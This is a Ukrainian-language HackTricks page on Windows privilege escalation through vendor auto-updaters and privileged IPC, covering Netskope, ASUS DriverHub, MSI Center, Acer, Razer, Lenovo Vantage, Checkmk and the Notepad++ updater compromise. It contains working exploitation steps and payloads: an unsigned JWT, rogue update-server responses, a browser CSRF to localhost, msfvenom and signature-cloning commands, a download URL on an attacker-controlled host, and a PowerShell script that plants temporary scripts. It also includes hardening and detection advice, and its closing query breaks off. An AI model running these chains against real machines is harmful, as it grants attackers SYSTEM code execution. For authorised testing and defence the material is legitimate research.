# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope, ASUS і MSI)

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено клас ланцюжків локального підвищення привілеїв у Windows, виявлених в агентах для корпоративних кінцевих пристроїв і автооновлювачах, які надають просту IPC-поверхню та привілейований механізм оновлення. Показовий приклад — Netskope Client для Windows < R129 (CVE-2025-0309), де користувач із низькими привілеями може змусити систему пройти реєстрацію на контрольованому атакувальником сервері, а потім доставити шкідливий MSI, який служба встановить від імені SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна застосувати до подібних продуктів:
- Зловживайте localhost IPC привілейованої служби, щоб примусити її повторно пройти реєстрацію або переконфігуруватися на сервер атакувальника.
- Реалізуйте кінцеві точки оновлення виробника, доставте зловмисний Trusted Root CA та вкажіть автооновлювачу на шкідливий «підписаний» пакет.
- Обходьте слабкі перевірки підписувача (списки дозволених CN), необов’язкові прапорці digest і недостатньо строгі властивості MSI.
- Якщо IPC «зашифрований», отримайте ключ/IV із загальнодоступних ідентифікаторів пристрою, збережених у реєстрі.
- Якщо служба обмежує клієнтів за шляхом до виконуваного файла або назвою процесу, виконайте ін’єкцію в процес зі списку дозволених або запустіть такий процес призупиненим і ініціалізуйте свою DLL за допомогою мінімальної зміни контексту потоку.

До користувацьких локальних TCP-служб слід застосовувати таку саму перевірку ідентичності та меж введення, навіть якщо для них потрібен PIN-код чи інші облікові дані програми. Визначте процес, що обслуговує слухач, і ефективний обліковий запис служби, а потім перевірте точний розгорнутий бінарний файл/версію та те, чи перевіряється довжина полів, контрольованих клієнтом, перед копіюванням у буфери фіксованого розміру або використанням для формування команди дочірнього процесу. У [рекомендаціях Microsoft щодо переповнення буфера](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) пояснено, чому неперевірені зовнішні дані становлять небезпеку в привілейованому нативному коді. Сам по собі loopback-слухач, жорстко закріплені облікові дані чи назва процесу не доводять наявності пошкодження пам’яті або виконання від імені SYSTEM; доступність, авторизація, шлях виконання коду та засоби захисту — це окремі умови. Під час звичайного переліку даних обмежуйтеся пасивними методами, а не надсилайте до робочої служби дані, довжина яких може спричинити збій.

---
## 1) Примусова реєстрація на сервері атакувальника через localhost IPC

У багатьох агентах є процес інтерфейсу користувача, який взаємодіє зі службою SYSTEM через localhost TCP, використовуючи JSON.

Спостереження щодо Netskope:
- UI: stAgentUI (низький рівень цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Послідовність експлуатації:
1) Створіть токен реєстрації JWT, claims якого визначають хост backend (наприклад, AddonUrl). Використайте alg=None, щоб підпис не був потрібен.
2) Надішліть IPC-повідомлення, яке викликає команду provisioning, разом із вашим JWT і назвою tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Сервіс починає надсилати запити до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка caller ґрунтується на path/name, надсилайте запит від імені allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC керування, доступний через мережу

Ця межа довіри не завжди обмежується localhost. У описаному випадку MyReport Updater 2.1.1 сервіс `LocalSystem` прослуховував усі інтерфейси та приймав неавтентифіковану зміну конфігурації gRPC для reference host, порту й режиму роботи. Для віддаленого варіанта були потрібні як мережевий доступ до listener, так і вихідний доступ сервісу до вибраного reference. Оцінюйте ці умови окремо від того, чи може подальший package flow обійти межу запису файлів.<sup>[[16]](#references)</sup>

---
## 2) Перехоплення каналу оновлення для запуску коду від імені SYSTEM

Коли клієнт починає взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і скеруйте його до MSI зловмисника. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON config із дуже коротким інтервалом оновлення updater, наприклад:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Повертає сертифікат CA у форматі PEM. Сервіс встановлює його в сховище Trusted Root для Local Machine.
3) /v2/checkupdate → Надає метадані, що вказують на шкідливий MSI та фальшиву версію.

Обхід поширених перевірок, які трапляються на практиці:
- Allow-list за CN підписувача: сервіс може лише перевіряти, чи дорівнює Subject CN значенню “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати leaf-сертифікат із таким CN і підписати MSI.
- Властивість CERT_DIGEST: додайте до MSI безпечну властивість із назвою CERT_DIGEST. Під час встановлення її не перевіряють.
- Необов’язкова перевірка digest: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

Результат: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок обходу виправлень: якщо постачальник у відповідь додає невеликий набір «довірених» доменів до allow-list замість криптографічної автентифікації джерела оновлень, шукайте належні постачальнику redirectors або reverse proxies, через які все ще можна спрямовувати трафік. У випадку Netskope подальші публічні дослідження показали, що allow-list епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксіював вміст Azure App Service, контрольований зловмисником. Сприймайте allow-list імен хостів як перешкоду, а не як межу довіри.<sup>[[14]](#references)</sup>

Ще один сценарій збою — **внутрішньо узгоджені, але неавтентифіковані метадані пакета**. У випадку MyReport контрольоване зловмисником посилання надавало змінений архів, а посередник змінював відповіді з MD5 digest і розміром від постачальника до того, як вони доходили до засобу оновлення. Збіг цих значень підтверджував узгодженість відповідей, а не походження від постачальника; колізія MD5 не була потрібна. Каталог встановлення, вибраний викликачем, перетворив привілейоване розпакування на межу запису файлів. Отриманий примітив завантаження DLL описано в розділі [перетворення довільного запису файлу на DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Підроблення зашифрованих IPC-запитів (якщо є)

Починаючи з R127, Netskope почав передавати JSON IPC у полі encryptData, яке виглядає як Base64. Реверс-інжиніринг показав використання AES із ключем/IV, отриманими зі значень реєстру, доступних для читання будь-якому користувачу:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Зловмисники можуть відтворити шифрування й надсилати дійсні зашифровані команди зі звичайного облікового запису користувача.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо агент раптом починає «шифрувати» свій IPC, шукайте ідентифікатори пристрою, GUID продукту та ідентифікатори встановлення в HKLM, які використовуються як матеріал.

---
## 4) Обхід allow-list викликачів IPC (перевірки шляху/імені)

Деякі служби намагаються автентифікувати вузол, визначаючи PID TCP-з’єднання та порівнюючи шлях/ім’я образу з allow-list бінарних файлів постачальника в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні способи обходу:
- DLL injection у процес із allow-list (наприклад, nsdiag.exe) і проксування IPC зсередини нього.
- Запустіть бінарний файл із allow-list у призупиненому стані та завантажте свою proxy DLL без CreateRemoteThread (див. §5), щоб виконати правила захисту драйвера від втручання.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Ін’єкція, сумісна із захистом від втручання: призупинений процес + патч NtContinue

У продуктах часто є драйвер minifilter/OB callbacks (наприклад, Stadrv), який прибирає небезпечні права з дескрипторів захищених процесів:
- Процес: прибирає PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Потік: обмежує до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode loader, що дотримується цих обмежень:
1) Створіть процес із бінарного файлу постачальника за допомогою CREATE_SUSPENDED.
2) Отримайте дескриптори, які вам іще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу та дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо патчити код за відомим RIP).
3) Перезапишіть ntdll!NtContinue (або інший ранній, гарантовано відображений thunk) невеликим stub, який викликає LoadLibraryW із шляхом до вашої DLL, а потім повертається назад.
4) Викличте ResumeThread, щоб запустити ваш stub у процесі й завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви його створили), політика драйвера виконується.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Практичні інструменти
- NachoVPN (плагін Netskope) автоматизує створення rogue CA, підписування шкідливого MSI та обслуговує потрібні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — це власний IPC-клієнт, який формує довільні IPC-повідомлення (за бажанням — зашифровані AES) і містить ін’єкцію в призупинений процес, щоб надсилати їх від імені бінарного файлу з allow-list.<sup>[[4]](#references)</sup>

## 7) Швидкий алгоритм первинної перевірки невідомих засобів оновлення/поверхонь IPC

Під час аналізу нового endpoint-агента або «допоміжного» набору програм для материнської плати швидкого алгоритму зазвичай достатньо, щоб визначити, чи є перспективною ціллю для privesc:<sup>[[6]](#references)</sup>

1) Перелічіть loopback listeners і визначте, яким процесам постачальника вони відповідають:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Перелічіть кандидатні іменовані канали:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Збирайте дані маршрутизації, що зберігаються в реєстрі й використовуються IPC-серверами на основі плагінів:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Спершу витягніть назви endpoint-ів, ключі JSON і command ID з клієнта користувацького режиму. Упаковані фронтенди Electron/.NET часто leak-ять повну схему:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Патерни, яким варто приділити пріоритетну увагу:
- `CryptQueryObject`/парсинг сертифікатів без `WinVerifyTrust` зазвичай означає, що «сертифікат існує» сприймалося як «сертифікат є довіреним», що уможливлює клонування сертифікатів та інші трюки з підробленими підписантами.
- Перевірки підрядка/суфікса для `Origin`, `Referer`, URL завантажень, імен процесів або CN підписанта — це не автентифікація. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою схожих доменів, контрольованих атакувальником.
- Якщо низькопривілейований GUI вирішує, що «файл є довіреним», а брокер SYSTEM лише використовує цей результат, патчинг або повторна реалізація клієнтської DLL/JS часто повністю обходить цей кордон (розділена валідація на кшталт Razer).
- Якщо брокер копіює payload до `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє його або планує запуск із цього шляху, одразу перевірте наявність вікон для TOCTOU-підміни та сусідніх модулів плагінів, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю named pipe, PipeViewer — це швидкий спосіб виявити слабкі DACL і віддалено доступні канали, перш ніж починати детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує викликачів лише за PID, шляхом до образу або назвою процесу, сприймайте це як перешкоду, а не як надійний кордон: часто достатньо впровадитися в легітимний клієнт або встановити з’єднання з процесу зі списку дозволених, щоб пройти перевірки сервера. Щодо named pipe, [ця сторінка про імперсонацію клієнта та зловживання pipe](named-pipe-client-impersonation.md) докладніше описує цей примітив.

Для привілейованого **брокера очищення або відновлення** перевірте межу довіри до шляхів, а також ACL каналу. Викликач із нижчими привілеями може мати змогу вибрати місце відновлення або перейменувати підготовлений артефакт резервної копії у спільному каталозі, навіть якщо виконуваний файл служби та її каталог встановлення захищені. Окремо підтвердьте, що викликач може звернутися до команди відновлення, змінити конкретний підготовлений вхідний файл або його ім’я, що брокер працює з вищими привілеями, а операція відновлення справді записує дані до вибраного захищеного шляху. Самої можливості запису до каталогу підготовки або читання з каналу недостатньо, щоб стверджувати про довільний привілейований запис; відображення призначення та поведінку служби потрібно перевірити аналізом коду або контрольованим тестуванням. Не запускайте невідому команду очищення під час пасивної розвідки, оскільки вона може видалити файли користувача.

---
## 8) Модульні брокери add-in, автентифіковані лише підписами постачальника (патерн Lenovo Vantage)

Новіший варіант, на який варто звернути увагу, — це **signed-client RPC broker**: низькопривілейований підписаний Lenovo настільний процес взаємодіє зі службою SYSTEM, а служба маршрутизує JSON-команди до набору add-in, описаних у XML, у `%ProgramData%`. Щойно вдається виконати код **усередині будь-якого прийнятого підписаного клієнта**, кожен контракт `runas="system"` стає частиною вашої поверхні атаки.<sup>[[15]](#references)</sup>

Високоцінні примітиви, виявлені під час дослідження Lenovo Vantage:
- **Довіра до викликачів на підставі підпису постачальника**: дослідники отримали автентифікований контекст, скопіювавши підписаний Lenovo EXE до каталогу з можливістю запису та задовольнивши умову DLL side-load (`profapi.dll`), завдяки чому довільний код виконувався всередині клієнта, якому служба вже довіряла.
- **Виявлення поверхні атаки на основі маніфестів**: add-in оголошуються у `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів виконуються від імені `SYSTEM`, тому перелік цих маніфестів часто швидше виявляє реальні привілейовані команди, ніж реверс самого брокера.
- **Помилки окремих команд у межах автентифікованого каналу**: опинившись усередині довіреного клієнта, дослідники виявили в публічних дослідженнях traversal шляхів і race conditions у командах оновлення/встановлення, зловживання raw SQL у привілейованих базах даних налаштувань, а також перевірки шляхів реєстру на основі підрядків, що уможливлювали записи за межами передбаченого hive.

Корисна розвідка цілі:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Практичний висновок: якщо набір допоміжних програм надає брокер, який спочатку автентифікує **процес-викликач**, а потім обробляє десятки команд плагінів/надбудов, не зупиняйтеся після обходу початкової перевірки довіри. Вивантажте таблицю маніфесту/контракту й окремо fuzz-тестуйте кожну команду з високими привілеями; автентифікований канал зазвичай приховує кілька вразливостей другого етапу.

---
## 1) CSRF із браузера на localhost проти привілейованих HTTP API (ASUS DriverHub)

DriverHub постачається з HTTP-сервісом у режимі користувача (ADU.exe) на 127.0.0.1:53000, який очікує на виклики браузера з https://driverhub.asus.com. Фільтр Origin лише виконує `string_contains(".asus.com")` для заголовка Origin і URL-адрес завантаження, які надає `/asus/v1.0/*`. Тому будь-який контрольований зловмисником хост, як-от `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати змінювальні стан запити з JavaScript.<sup>[[6]](#references)</sup> Див. [основи CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md), щоб дізнатися про інші способи обходу.

Практичний сценарій:
1) Зареєструйте домен, що містить `.asus.com`, і розмістіть на ньому шкідливу вебсторінку.
2) Використайте `fetch` або XHR, щоб викликати привілейовану кінцеву точку (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть JSON-тіло, яке очікує обробник, — упакований JS фронтенду показує наведену нижче схему.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Навіть наведений нижче PowerShell CLI працює успішно, якщо підмінити заголовок Origin на довірене значення:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Будь-який перехід у браузері на сайт атакувальника стає локальним CSRF в 1 клік (або в 0 кліків через `onload`), який запускає допоміжний процес із правами SYSTEM.

---
## 2) Ненадійна перевірка code-signing і клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, задані в тілі JSON, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка URL завантаження повторно використовує ту саму логіку пошуку підрядка, тому приймається `http://updates.asus.com.attacker.tld:8000/payload.exe`. Після завантаження ADU.exe лише перевіряє, чи містить PE підпис і чи збігається рядок Subject з ASUS, перш ніж запустити його — без `WinVerifyTrust` і перевірки ланцюжка сертифікатів.

Щоб перетворити цей сценарій на експлойт:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підпис ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на домені-клона `.asus.com` і запустіть UpdateApp через описаний вище браузерний CSRF.

Оскільки і фільтри Origin та URL шукають підрядки, а перевірка підписанта лише порівнює рядки, DriverHub завантажує та виконує бінарний файл атакувальника з підвищеними правами.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у шляхах копіювання/виконання засобу оновлення (MSI Center CMD_AutoUpdateSDK)

Служба MSI Center з правами SYSTEM надає TCP-протокол, у якому кожен кадр має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його обробник:
1) Копіює переданий виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює заплановане завдання, яке запускає тимчасовий файл із правами SYSTEM і аргументами, контрольованими атакувальником.

Скопійований файл не блокується між перевіркою та `ExecuteTask()`. Атакувальник може:
- Надіслати Frame A із вказівником на легітимний бінарний файл із підписом MSI (це гарантує успішне проходження перевірки підпису та створення завдання).
- Створити гонку, надсилаючи повторні повідомлення Frame B із вказівником на шкідливий payload, щоб перезаписати `MSI Center SDK.exe` одразу після завершення перевірки.

Коли планувальник запустить завдання, він виконає перезаписаний payload із правами SYSTEM, попри те, що перевірив початковий файл. Для надійного експлойту використовуються дві goroutine/threads, які безперервно надсилають CMD_AutoUpdateSDK, доки не буде виграно вікно TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Зловживання власним IPC на рівні SYSTEM та impersonation (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти кадру вибирають цей компонент, даючи атакувальникам змогу спрямовувати команди до довільних модулів.
- Plugins можуть визначати власні засоби запуску завдань. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і напряму викликає `API_Support.EX_Task::ExecuteTask()` **без перевірки підпису** — будь-який локальний користувач може вказати `C:\Users\<user>\Desktop\payload.exe` і гарантовано отримати виконання з правами SYSTEM.
- Перехоплення loopback-трафіку у Wireshark або інструментування бінарних файлів .NET у dnSpy швидко виявляє відповідність Component ↔ command; після цього можна повторно надсилати кадри за допомогою власних клієнтів на Go/Python.<sup>[[6]](#references)</sup>

### Іменовані канали Acer Control Centre та рівні impersonation
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє віддаленим клієнтам підключатися (наприклад, через `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` із шляхом до файлу викликає процедуру запуску процесу в службі.
- Клієнтська бібліотека серіалізує разом з аргументами магічний байт-термінатор (113). Динамічне інструментування за допомогою Frida/`TsDotNetLib` (поради з інструментування див. у розділі [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показує, що нативний обробник перетворює це значення на `SECURITY_IMPERSONATION_LEVEL` та integrity SID перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) переводить виконання у загальну гілку, яка зберігає повний токен SYSTEM і встановлює SID високого рівня цілісності (`S-1-16-12288`). Тому запущений бінарний файл працює з необмеженими правами SYSTEM як локально, так і на іншій машині.
- Поєднайте це з доступним прапорцем інсталятора (`Setup.exe -nocheck`), щоб встановити ACC навіть на лабораторних віртуальних машинах і перевірити канал без обладнання виробника.<sup>[[6]](#references)</sup>

Ці помилки IPC показують, чому локальні служби мають вимагати взаємної автентифікації (ALPC SIDs, фільтрів `ImpersonationLevel=Impersonation`, фільтрації токенів), а також чому всі допоміжні засоби модулів для «запуску довільного бінарного файлу» мають використовувати однакові перевірки підписанта.

---
## 3) COM/IPC-помічники «elevator» зі слабкою перевіркою в user mode (Razer Synapse 4)

У Razer Synapse 4 з’явився ще один характерний для цієї групи сценарій: користувач із низькими привілеями може попросити COM-помічник запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делегується DLL у user mode (`simple_service.dll`) замість надійної перевірки в межах привілейованого компонента.

Спостережений шлях експлуатації:
- Створити екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викликати `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити запуск із підвищеними правами.
- У публічному PoC перевірку PE-підпису в `simple_service.dll` пропатчено перед надсиланням запиту, що дозволяє запустити довільний виконуваний файл, вибраний атакувальником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Загальний висновок: під час реверсингу «допоміжних» наборів не обмежуйтеся localhost TCP або named pipes. Перевіряйте наявність COM-класів із назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з’ясовуйте, чи привілейована служба сама перевіряє цільовий бінарний файл, чи лише довіряє результату, обчисленому DLL клієнта в user-mode, яку можна модифікувати. Ця схема поширюється не лише на Razer: будь-яка розділена архітектура, у якій брокер із високими привілеями отримує рішення дозволити/заборонити від низькопривілейованої сторони, може бути поверхнею для privesc.


---
## Виконання передбачуваного тимчасового скрипту під час відновлення MSI (Checkmk Agent / CVE-2024-0670)

Деякі агенти Windows досі реалізують привілейовані дії, записуючи тимчасовий файл `.cmd` у `C:\Windows\Temp` і запускаючи його від імені `SYSTEM`. Якщо ім’я файлу передбачуване, а служба не створює файл повторно безпечним способом, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл і позначити його як **read-only**, змусивши привілейований процес виконати вміст, контрольований атакувальником, замість власного скрипту.

Виявлено у вразливих збірках Checkmk Agent:
- шаблон тимчасового файлу: `cmk_all_<PID>_1.cmd`
- уражені гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: **відновлення** MSI кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний алгоритм:
1. Оцініть реалістичний діапазон PID за поточними ідентифікаторами процесів або PID запущеного агента.
2. Запишіть короткий `.cmd` payload у кодуванні **ASCII** (`Set-Content -Encoding Ascii` або перенаправлення виводу `cmd.exe`; не використовуйте вивід PowerShell у UTF-16 для batch-файлів).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` для всіх PID у можливому діапазоні та позначте кожен файл як read-only.
4. Запустіть відновлення кешованого MSI, щоб привілейована служба спробувала створити тимчасовий скрипт повторно, а потім виконала його.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте MSI-файл із випадковою назвою в кеші `C:\Windows\Installer` з назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Операційні примітки:
- `qwinsta` корисна, коли `msiexec /fa` завершується помилкою з неінтерактивної оболонки WinRM і потрібно з’ясувати, чи наявний сеанс робочого стола або від’єднаний сеанс може належним чином запустити відновлення.<sup>[[7]](#references)</sup>
- Цей шаблон можна застосувати до інших агентів кінцевих точок і програм оновлення, які **розміщують тимчасові скрипти в доступних для запису всім місцях, а згодом виконують їх від імені SYSTEM**. Перевіряйте наявність передбачуваних імен, відсутність семантики ексклюзивного створення та можливість запуску процесів відновлення/оновлення за запитом.

### Відновлення інтерактивного інсталятора та привілейована консоль

PDF24 Creator 11.15.1 демонструє окремий ризик відновлення MSI: під час відновлення спеціальна дія встановлення принтера може запускати видиму консоль із правами SYSTEM. У версії 11.15.2 постачальник змінив інсталятор MSI, щоб усунути таку поведінку. Стара версія продукту — лише підказка для первинного аналізу. Перевірте зареєстрований або доступний пакет MSI, чи може цей користувач ініціювати відновлення, чи наявні вразлива спеціальна дія та затримка через файл журналу, а також чи може інтерактивний робочий стіл показати консоль. У повідомленні про проблему затримку створювали за допомогою oplock на `faxPrnInst.log`; звичайного доступу до файлу на запис недостатньо. Неінтерактивна оболонка, недоступний пакет або виправлений інсталятор можуть перервати ланцюжок. Ця проблема не залежить від `AlwaysInstallElevated` і відрізняється від заміни передбачуваного тимчасового скрипту.

---
## Віддалене перехоплення ланцюжка постачання через слабку перевірку програми оновлення (WinGUp / Notepad++)

З червня 2025 року до грудня 2025 року зловмисники, які скомпрометували інфраструктуру хостингу, що підтримувала процес оновлення Notepad++, вибірково надсилали шкідливі маніфести окремим жертвам. Старіші програми оновлення на базі WinGUp не повністю перевіряли справжність оновлень, тому шкідлива відповідь XML могла перенаправити клієнтів на URL-адреси під контролем зловмисників. Оскільки клієнт приймав вміст HTTPS, не перевіряючи одночасно довірений ланцюжок сертифікатів і дійсний PE-підпис завантаженого інсталятора, жертви завантажували та запускали троянізований `update.exe` формату NSIS.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний ланцюжок (локальна експлуатація не потрібна):
1. **Перехоплення інфраструктури**: скомпрометувати CDN/хостинг і під час перевірки оновлень надсилати метадані зловмисника, які вказують на шкідливу URL-адресу завантаження.
2. **Троянізований NSIS**: інсталятор завантажує/запускає корисне навантаження та зловживає двома ланцюжками виконання:
   - **Bring-your-own signed binary + sideload**: включити підписаний `BluetoothService.exe` від Bitdefender і розмістити шкідливий `log.dll` у шляху пошуку. Після запуску підписаного бінарного файла Windows виконує sideload `log.dll`, який розшифровує та рефлексивно завантажує бекдор Chrysalis (захищений Warbird + хешування API для ускладнення статичного виявлення).
   - **Scripted shellcode injection**: NSIS запускає скомпільований скрипт Lua, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для ін’єкції shellcode та розміщення Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Рекомендації щодо посилення захисту та виявлення для будь-якої програми оновлення:
- Вимагайте **перевірки сертифіката й підпису** завантаженого інсталятора (закріплюйте сертифікат підписувача постачальника, відхиляйте невідповідні CN/ланцюжки) і підписуйте сам маніфест оновлення (наприклад, XMLDSig). Блокуйте перенаправлення, задані в маніфесті, якщо їх не перевірено.
- Розглядайте **sideload підписаного бінарного файла BYO** як напрямок виявлення після завантаження: створюйте сповіщення, коли підписаний EXE постачальника завантажує DLL з іменем, розташованим поза канонічним шляхом інсталяції (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли програма оновлення розміщує/запускає інсталятори з тимчасового каталогу, підписані не постачальником.
- Відстежуйте **артефакти, специфічні для шкідливого ПЗ**, помічені в цьому ланцюжку (корисні як загальні точки пошуку): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%` і етапи ін’єкції shellcode, керовані Lua.
- Notepad++ посилив WinGUp у версії v8.8.9 і новіших: отриманий XML тепер підписується (XMLDSig), а новіші збірки вимагають перевірки сертифіката й підпису завантаженого інсталятора, а не довіряють лише каналу передавання.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading підписаного Bitdefender EXE з DLL <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
